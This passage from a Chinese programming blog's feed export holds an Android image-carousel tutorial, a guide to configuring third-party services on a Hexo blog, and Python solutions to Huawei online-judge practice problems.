<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></div><div class="line">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></div><div class="line">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span>&gt;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">com.jude.rollviewpager.RollPagerView</span></span></div><div class="line">        <span class="attr">android:id</span>=<span class="string">"@+id/roll_view_pager"</span></div><div class="line">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></div><div class="line">        <span class="attr">android:layout_height</span>=<span class="string">"180dp"</span></div><div class="line">        <span class="attr">app:rollviewpager_play_delay</span>=<span class="string">"3000"</span>/&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></div></pre></td></tr></table></figure>
<p>　　存放 4 张图片到工程 res 目录下的 drawable 文件夹下，命名为 img1，img2，img3，img4。Java文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        <span class="comment">/**使用RollPagerView实现图片轮播**/</span></div><div class="line">        mRollViewPager = (RollPagerView) view.findViewById(R.id.roll_view_pager);</div><div class="line">        <span class="comment">//设置播放时间间隔</span></div><div class="line">        mRollViewPager.setPlayDelay(<span class="number">2000</span>);</div><div class="line">        <span class="comment">//设置透明度</span></div><div class="line">        mRollViewPager.setAnimationDurtion(<span class="number">500</span>);</div><div class="line">        <span class="comment">//设置适配器</span></div><div class="line">        mRollViewPager.setAdapter(<span class="keyword">new</span> TestNormalAdapter());</div><div class="line">        <span class="comment">//设置指示器（顺序依次）</span></div><div class="line">        mRollViewPager.setHintView(<span class="keyword">new</span> ColorPointHintView(view.getContext(), Color.YELLOW, Color.WHITE));</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TestNormalAdapter</span> <span class="keyword">extends</span> <span class="title">StaticPagerAdapter</span> </span>&#123;</div><div class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] imgs = &#123;</div><div class="line">                R.drawable.img1,</div><div class="line">                R.drawable.img2,</div><div class="line">                R.drawable.img3,</div><div class="line">                R.drawable.img4,</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(ViewGroup container, <span class="keyword">int</span> position)</span> </span>&#123;</div><div class="line">            ImageView view = <span class="keyword">new</span> ImageView(container.getContext());</div><div class="line">            view.setImageResource(imgs[position]);</div><div class="line">            view.setScaleType(ImageView.ScaleType.CENTER_CROP);</div><div class="line">            view.setLayoutParams(<span class="keyword">new</span> ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));</div><div class="line">            view.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()      <span class="comment">// 点击事件</span></div><div class="line">            &#123;</div><div class="line">                <span class="meta">@Override</span></div><div class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">                &#123;</div><div class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"你点击了第"</span> + (position + <span class="number">1</span>) + <span class="string">"张图片"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">                &#125;</div><div class="line">            &#125;);</div><div class="line">            <span class="keyword">return</span> view;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">return</span> imgs.length;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　写到这里，其实还是有话要说。现在连图片轮播都有开源框架了，自己要写的代码真的越来越少，要考虑的问题也越来越少。我们常常说不要重复造轮子，但是越来越觉得自己根本不会造轮子。注重基础，在自己实现过的基础上，再去对比开源框架，如果确实比自己做得好，那你应该认真思考自己写的程序的不足，然后可以采用开源框架进行开发。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>RollViewPager</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Pages + Hexo 搭建博客（三）</title>
    <url>/2016/12/06/Github%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<p>　　此篇博客主要介绍了自己的博客站点所使用的一些第三方服务的配置，以及主题的一些优化。当然，每个人的需要都不太相同，大家也可以根据自己的喜好去选择使用第三方服务来让自己的博客站点更完善更强大。</p>
<a id="more"></a>
<p>再次强调：在Hexo中有两份主要的配置文件，其名称都是_config.yml。其中，一份位于站点根目录下，主要包含Hexo本身的配置,我们称之为<strong>全局配置文件</strong>；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项,我们称之为<strong>主题配置文件</strong>。</p>
<h4 id="博客图片存放"><a href="#博客图片存放" class="headerlink" title="博客图片存放"></a>博客图片存放</h4><p>Markdown编辑器支持插入图片，可以直接给出图片的链接，因此我们可以将图片存放在我们hexo项目的目录下，再填写对应的路径，也可以将其存放在云服务器上，然后给出链接。</p>
<p>在这里，我们介绍使用七牛云来进行图片托管。七牛云是国内领先的企业级云服务商,致力于打造以数据为核心的场景化PaaS服务，图片加载速度还不错，一般也不会出现图片挂掉的情况。</p>
<h5 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h5><p>注册申请一个个人账号，然后激活邮箱完成注册。</p>
<p>官网地址：<a href="http://www.qiniu.com/" target="_blank" rel="external">http://www.qiniu.com/</a></p>
<h5 id="存储图片"><a href="#存储图片" class="headerlink" title="存储图片"></a>存储图片</h5><p>（1）点击左侧菜单的对象存储</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-1.png" alt="5-1"></p>
<p>（2）点击上端的添加来创建存储空间</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-2.png" alt="5-2"></p>
<p>（3）填写好基本信息，点击确定创建</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-3.png" alt="5-3"></p>
<p>（4）来到新创建的存储空间，点击内容管理</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-4.png" alt="5-4"></p>
<p>（5）在内容管理中可以看到文件列表，点击上传文件</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-5.png" alt="5-5"></p>
<p>（6）可以设置上传的文件的前缀，以便进行分类管理</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-6.png" alt="5-6"></p>
<p>（7）点击关闭，回到内容管理页面查看上传的文件，复制图片链接</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-7.png" alt="5-7"></p>
<p>至此，我们就将我们博客需要的图片存储到了七牛云，然后我们只要将复制的图片链接插入到博客人文章中即可显示图片，感觉显示速度还是蛮快的。</p>
<h4 id="配置第三方服务"><a href="#配置第三方服务" class="headerlink" title="配置第三方服务"></a>配置第三方服务</h4><h5 id="多说社会化评论"><a href="#多说社会化评论" class="headerlink" title="多说社会化评论"></a>多说社会化评论</h5><p>（1）多说创建站点</p>
<p><a href="http://duoshuo.com/" target="_blank" rel="external">多说官网：http://duoshuo.com/</a></p>
<p>登录多说官网，点击主页的我要安装来到创建站点页面填写基本信息：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-8.png" alt="5-8"></p>
<p>点击创建后出现：<strong>服务异常,请联系客服人员</strong>的错误不是因为真的出现异常，而是你填写的用户名或者其他信息不符合他的要求，只是他没有提示你，这是需要注意的地方。比如我遇到的是用户名不能使用‘-’中划线和‘_’下划线，或者多说域名填写格式错误。</p>
<p>（2）创建站点完成后在全局配置文件中新增duoshuo_shortname字段。</p>
<p>值设置成上一步中填写的值（红色方框框出部分的值）</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">duoshuo_shortname: fzyLine</div></pre></td></tr></table></figure>
<p>（3）实现效果</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-9.png" alt="5-9"></p>
<h5 id="多说分享"><a href="#多说分享" class="headerlink" title="多说分享"></a>多说分享</h5><p>多说分享必须与多说评论同时使用</p>
<p>编辑全局配置文件，添加字段 duoshuo_share，值为 true。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># 多说分享服务</div><div class="line">duoshuo_share: true</div></pre></td></tr></table></figure>
<p>实现效果：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-10.png" alt="5-10"></p>
<h5 id="不蒜子统计"><a href="#不蒜子统计" class="headerlink" title="不蒜子统计"></a>不蒜子统计</h5><p>编辑全局配置文件中的busuanzi_count的配置项。</p>
<p>当enable: true时，代表开启全局开关。若site_uv、site_pv、page_pv的值均为false时，不蒜子仅作记录而不会在页面上显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">busuanzi_count:</div><div class="line">  # count values only if the other configs are false</div><div class="line">  enable: true</div><div class="line">  # custom uv span for the whole site</div><div class="line">  site_uv: true</div><div class="line">  site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;    #如果使用默认的，会显示图标</div><div class="line">  site_uv_footer:</div><div class="line">  # custom pv span for the whole site</div><div class="line">  site_pv: true</div><div class="line">  site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;     #如果使用默认的，会显示图标</div><div class="line">  site_pv_footer:</div><div class="line">  # custom pv span for one page only</div><div class="line">  page_pv: true</div><div class="line">  page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt;  #如果使用默认的，会显示图标</div><div class="line">  page_pv_footer:</div></pre></td></tr></table></figure>
<p>实现效果：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-11.png" alt="5-11"></p>
<p>可以修改成如下的样子：</p>
<p>当site_uv: true时，代表在页面底部显示站点的UV值。即访客数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># 效果：本站访客数12345人次</div><div class="line">site_uv: true</div><div class="line">site_uv_header: 本站访客数</div><div class="line">site_uv_footer: 人次</div></pre></td></tr></table></figure>
<p>当site_pv: true时，代表在页面底部显示站点的PV值。即总访问量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># 效果：本站总访问量12345次</div><div class="line">site_pv: true</div><div class="line">site_pv_header: 本站总访问量</div><div class="line">site_pv_footer: 次</div></pre></td></tr></table></figure>
<p>当page_pv: true时，代表在文章页面的标题下显示该页面的PV值（阅读数）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># 效果：本文总阅读量12345次</div><div class="line">page_pv: true</div><div class="line">page_pv_header: 本文总阅读量</div><div class="line">page_pv_footer: 次</div></pre></td></tr></table></figure></p>
<h5 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h5><p>next主题的官方文档提供了几种实现搜索服务的方式，我们就使用配置最简单的Local Search，添加百度/谷歌/本地 自定义站点内容搜索。</p>
<p>（1）安装 hexo-generator-searchdb，在站点目录下执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ npm install hexo-generator-searchdb --save</div></pre></td></tr></table></figure>
<p>（2）编辑全局配置文件，新增以下内容到任意位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">search:</div><div class="line">  path: search.xml</div><div class="line">  field: post</div><div class="line">  format: html</div><div class="line">  limit: 10000</div></pre></td></tr></table></figure>
<p>（3）实现效果：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-12.png" alt="5-12"></p>
<h4 id="开启打赏功能"><a href="#开启打赏功能" class="headerlink" title="开启打赏功能"></a>开启打赏功能</h4><p>next主题开启打赏功能很简单，我们只需要在全局配置文件中填入微信和支付宝收款二维码图片地址即可开启该功能。先到微信和支付宝将自己收款二维码图片保存，我们同样可以将其存在七牛云上，然后贴到下面的配置文件里。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！</div><div class="line">wechatpay: 微信当面付图片的url</div><div class="line">alipay: 支付宝当面付图片的url</div></pre></td></tr></table></figure>
<p>实现效果：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/5-13.png" alt="image"></p>
<p>Github pages + Hexo搭建静态博客站点的系列文章到这里就完结了，其实也算是一个很详细的教程了，花了一些时间来整理。之后可能不会再更新，但是，如果之后遇到一些问题或者有更好的推荐，可能还会再写。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(十)</title>
    <url>/2016/12/04/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%8D%81/</url>
    <content><![CDATA[<p>　　继续使用Python进行算法练习解题，此篇博客的5道题依然来自于牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练(6-10题)。</p>
<a id="more"></a>
<p>地址如下：<a href="https://www.nowcoder.com/ta/huawei" target="_blank" rel="external">https://www.nowcoder.com/ta/huawei</a></p>
<h4 id="质数因子"><a href="#质数因子" class="headerlink" title="质数因子"></a>质数因子</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>功能:输入一个正整数，按照从小到大的顺序输出它的所有质数的因子（如180的质数因子为2 2 3 3 5 ）,最后一个数后面也要有空格</p>
<p>详细描述：</p>
<p>函数接口说明：</p>
<p>public String getResult(long ulDataInput)</p>
<p>输入参数：</p>
<p>long ulDataInput：输入的正整数</p>
<p>返回值：</p>
<p>String</p>
<p>输入描述:</p>
<p>输入一个long型整数</p>
<p>输出描述:</p>
<p>按照从小到大的顺序输出它的所有质数的因子，以空格隔开。最后一个数后面也要有空格。</p>
<p>输入例子:</p>
<p>180</p>
<p>输出例子:</p>
<p>2 2 3 3 5</p>
<h5 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h5><p>如果一个数是质数，那么它的倍数都不是质数。</p>
<p>我们不需要考虑是否是质数因子，因为每次得到的那个因子肯定是质数因子，其他数都可以从这些质数因子相乘得到。比如，i = 4能被整除的不可能出现，因为当i=2时已经被全求出来了。</p>
<p>这个题的思路其实不太好描述，还是看代码吧！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        n = int(raw_input())</div><div class="line">        i = <span class="number">2</span></div><div class="line">        <span class="keyword">while</span> n&gt;<span class="number">1</span>:</div><div class="line">            <span class="keyword">while</span>(n%i == <span class="number">0</span>):</div><div class="line">                <span class="keyword">print</span> i,    </div><div class="line">                n = n/i</div><div class="line">            i += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>python中print输出一行，如果想多次输出的内容不换行，可以在print后面加逗号.</p>
<h4 id="取近似值"><a href="#取近似值" class="headerlink" title="取近似值"></a>取近似值</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>写出一个程序，接受一个正浮点数值，输出该数值的近似整数值。如果小数点后数值大于等于5,向上取整；小于5，则向下取整。</p>
<p>输入描述:</p>
<p>输入一个正浮点数值</p>
<p>输出描述:</p>
<p>输出该数值的近似整数值</p>
<p>输入例子:</p>
<p>5.5</p>
<p>输出例子:</p>
<p>6</p>
<h5 id="Python实现-1"><a href="#Python实现-1" class="headerlink" title="Python实现"></a>Python实现</h5><p>将输入的数据转换成float类型，再用round函数进行四舍五入，最后转换成int类型进行输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line">num = sys.stdin.readline()  <span class="comment">#读取一行数据</span></div><div class="line"><span class="keyword">print</span> int(round(float(num)))</div></pre></td></tr></table></figure>
<h4 id="合并表记录"><a href="#合并表记录" class="headerlink" title="合并表记录"></a>合并表记录</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>数据表记录包含表索引和数值，请对表索引相同的记录进行合并，即将相同索引的数值进行求和运算，输出按照key值升序进行输出。</p>
<p>输入描述:</p>
<p>先输入键值对的个数，然后输入成对的index和value值，以空格隔开</p>
<p>输出描述:</p>
<p>输出合并后的键值对（多行）</p>
<p>输入例子:</p>
<p>4</p>
<p>0 1</p>
<p>0 2</p>
<p>1 2</p>
<p>3 4</p>
<p>输出例子:</p>
<p>0 3</p>
<p>1 2</p>
<p>3 4</p>
<h5 id="Python实现-2"><a href="#Python实现-2" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">n = int(raw_input())</div><div class="line">dic = &#123;&#125;    <span class="comment">#构造字典</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    item = raw_input().split()  <span class="comment">#获取一行输入</span></div><div class="line">    key = int(item[<span class="number">0</span>])  <span class="comment">#得到该行的第一个数：键</span></div><div class="line">    value = int(item[<span class="number">1</span>])    <span class="comment">#得到该行的第二个数：值</span></div><div class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> dic:  <span class="comment">#如果字典中已经存在这个键，则将其键值相加</span></div><div class="line">        dic[key] += value;</div><div class="line">    <span class="keyword">else</span>:   <span class="comment">#否则添加新的键值对</span></div><div class="line">        dic[key] = value;</div><div class="line"></div><div class="line">lst = dic.keys()    <span class="comment">#获取字典的所有键</span></div><div class="line">lst.sort()  <span class="comment">#对键进行排序</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:   <span class="comment">#根据键从小到大输出</span></div><div class="line">    <span class="keyword">print</span> i,dic[i]</div></pre></td></tr></table></figure>
<h4 id="提取不重复的整数"><a href="#提取不重复的整数" class="headerlink" title="提取不重复的整数"></a>提取不重复的整数</h4><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>输入一个int型整数，按照从右向左的阅读顺序，返回一个不含重复数字的新的整数。</p>
<p>输入描述:</p>
<p>输入一个int型整数</p>
<p>输出描述:</p>
<p>按照从右向左的阅读顺序，返回一个不含重复数字的新的整数</p>
<p>输入例子:</p>
<p>9876673</p>
<p>输出例子:</p>
<p>37689</p>
<h5 id="Python实现-3"><a href="#Python实现-3" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">input_str = raw_input()</div><div class="line">res = []    </div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list(reversed(input_str)):    <span class="comment">#反转字符串，并将其转换从列表</span></div><div class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res:    <span class="comment">#去除重复的数字</span></div><div class="line">        res.append(i)</div><div class="line"><span class="keyword">print</span> <span class="string">""</span>.join(res)    <span class="comment">#列表转字符串</span></div></pre></td></tr></table></figure>
<h4 id="字符个数统计"><a href="#字符个数统计" class="headerlink" title="字符个数统计"></a>字符个数统计</h4><h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><p>编写一个函数，计算字符串中含有的不同字符的个数。字符在ACSII码范围内(0~127)。不在范围内的不作统计。</p>
<p>输入描述:</p>
<p>输入N个字符，字符在ACSII码范围内。</p>
<p>输出描述:</p>
<p>输出范围在(0~127)字符的个数。</p>
<p>输入例子:</p>
<p>abc</p>
<p>输出例子:</p>
<p>3</p>
<h5 id="Python实现-4"><a href="#Python实现-4" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(input_str)</span>:</span>   <span class="comment">#自定义处理函数</span></div><div class="line">    s = []</div><div class="line">    cnt = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> input_str:    <span class="comment">#去除重复的字符</span></div><div class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> s:</div><div class="line">            s.append(ch)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:     <span class="comment">#统计个数</span></div><div class="line">        <span class="keyword">if</span> (ord(c) &gt;=<span class="number">0</span> <span class="keyword">and</span> ord(c) &lt;= <span class="number">127</span>):</div><div class="line">            cnt+=<span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> cnt</div><div class="line"></div><div class="line">input_str = sys.stdin.readline()    <span class="comment">#根据题目要求要实现多组数据的测试</span></div><div class="line">count(input_str)    <span class="comment">#调用函数处理</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法学习</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(九)</title>
    <url>/2016/12/03/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B9%9D/</url>
    <content><![CDATA[<p>　　近来，越来越感受到Python的魅力，简洁的书写，相对高效的实现，写起来很舒服。以前只是用python做一些应用，也只是需要什么就去学什么，并没有真正系统地学习这门语言，现在结合书本和教学视频系统地进行学习，然后再通过Python来练习这些算法题，突然发现也是一种不错的学习方式。</p>
<a id="more"></a>
<p>下面的题目均来自牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练</p>
<p>地址如下：<a href="https://www.nowcoder.com/ta/huawei" target="_blank" rel="external">https://www.nowcoder.com/ta/huawei</a></p>
<h4 id="字符串最后一个单词的长度"><a href="#字符串最后一个单词的长度" class="headerlink" title="字符串最后一个单词的长度"></a>字符串最后一个单词的长度</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>计算字符串最后一个单词的长度，单词以空格隔开。</p>
<p>输入描述:</p>
<p>一行字符串，非空，长度小于5000。</p>
<p>输出描述:</p>
<p>整数N，最后一个单词的长度。</p>
<p>输入例子:</p>
<p>hello world</p>
<p>输出例子:</p>
<p>5</p>
<h5 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h5><p>这个题目本身就比较简单，python来实现则更加简单，因为python提供了很多方便快捷地方法，比如此题，split方法可以将我们输入的字符串切分成列表，然后取出列表最后一个元素即最后一个单词，再用len方法得到该单词的长度。列表中，负数索引是从列表右端即尾部开始，-1索引即为最后一个元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">mystr = raw_input()</div><div class="line"><span class="keyword">print</span> len(mystr.split(<span class="string">' '</span>)[<span class="number">-1</span>])</div></pre></td></tr></table></figure>
<h4 id="计算字符个数"><a href="#计算字符个数" class="headerlink" title="计算字符个数"></a>计算字符个数</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>写出一个程序，接受一个有字母和数字以及空格组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。</p>
<p>输入描述:</p>
<p>输入一个有字母和数字以及空格组成的字符串，和一个字符。</p>
<p>输出描述:</p>
<p>输出输入字符串中含有该字符的个数。</p>
<p>输入例子:</p>
<p>ABCDEF</p>
<p>A</p>
<p>输出例子:</p>
<p>1</p>
<h5 id="Python实现-1"><a href="#Python实现-1" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">input_str = raw_input()     <span class="comment">#获取字符串</span></div><div class="line">tag = raw_input()   <span class="comment">#获取目标字符</span></div><div class="line">lst = list(input_str.lower())   <span class="comment">#题目中说明不区分大小写，所以全部转换从小写，然后将字符串转换成列表</span></div><div class="line"><span class="keyword">print</span> lst.count(tag.lower())    <span class="comment">#统计字符在列表中出现的次数</span></div></pre></td></tr></table></figure>
<h4 id="明明的随机数"><a href="#明明的随机数" class="headerlink" title="明明的随机数"></a>明明的随机数</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>明明想在学校中请一些同学一起做一项问卷调查，为了实验的客观性，他先用计算机生成了N个1到1000之间的随机整数（N≤1000），对于其中重复的数字，只保留一个，把其余相同的数去掉，不同的数对应着不同的学生的学号。然后再把这些数从小到大排序，按照排好的顺序去找同学做调查。请你协助明明完成“去重”与“排序”的工作。</p>
<p>Input Param n    输入随机数的个数</p>
<p>inputArray       n个随机整数组成的数组</p>
<p>Return Value OutputArray    输出处理后的随机整数</p>
<p>注：测试用例保证输入参数的正确性，答题者无需验证。测试用例不止一组。</p>
<p>输入描述:</p>
<p>输入多行，先输入随机整数的个数，再输入相应个数的整数</p>
<p>输出描述:</p>
<p>返回多行，处理后的结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入例子:</div><div class="line">11</div><div class="line">10</div><div class="line">20</div><div class="line">40</div><div class="line">32</div><div class="line">67</div><div class="line">40</div><div class="line">20</div><div class="line">89</div><div class="line">300</div><div class="line">400</div><div class="line">15</div><div class="line"></div><div class="line">输出例子:</div><div class="line">10</div><div class="line">15</div><div class="line">20</div><div class="line">32</div><div class="line">40</div><div class="line">67</div><div class="line">89</div><div class="line">300</div><div class="line">400</div></pre></td></tr></table></figure>
<h5 id="Python实现-2"><a href="#Python实现-2" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:     <span class="comment">#题目要求有多组数据，需要循环</span></div><div class="line">    <span class="keyword">try</span>:    <span class="comment">#捕获异常</span></div><div class="line">        n = int(raw_input())    <span class="comment">#确定要输入多少个数据</span></div><div class="line">        l = []</div><div class="line"></div><div class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,n):</div><div class="line">            k = sys.stdin.readline()    <span class="comment">#输入n个数</span></div><div class="line">            l.append(int(k))</div><div class="line">        res = list(set(l))  <span class="comment">#集合是不重复的，这样做可以去除list中重复的元素</span></div><div class="line">        res.sort()  <span class="comment">#对去重后的列表进行排序</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:   <span class="comment">#打印结果</span></div><div class="line">            <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<h4 id="字符串分隔"><a href="#字符串分隔" class="headerlink" title="字符串分隔"></a>字符串分隔</h4><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li>连续输入字符串，请按长度为8拆分每个字符串后输出到新的字符串数组；</li>
<li>长度不是8整数倍的字符串请在后面补数字0，空字符串不处理。</li>
</ul>
<p>输入描述:</p>
<p>连续输入字符串(输入2次,每个字符串长度小于100)</p>
<p>输出描述:</p>
<p>输出到长度为8的新字符串数组</p>
<p>输入例子:</p>
<p>abc</p>
<p>123456789</p>
<p>输出例子:</p>
<p>abc00000</p>
<p>12345678</p>
<p>90000000</p>
<h5 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python实现</h5><p>这里采用一种巧妙地办法，因为要以8为间隔输出字符串，所以我们先判断字符串长度是否为0，如果不为0，则在字符串末尾添加7个0，这样就不用考虑后面会缺几个0了，方便后面的输出，输出时我们只要以8为间隔输出，然后不满8个字符就不用输出了，肯定是末尾我们补上的多余的0了。</p>
<p>以下三种写法基本思路一样，关键在于输出的时候可以采用不同的办法进行处理。</p>
<p>（1）写法一</p>
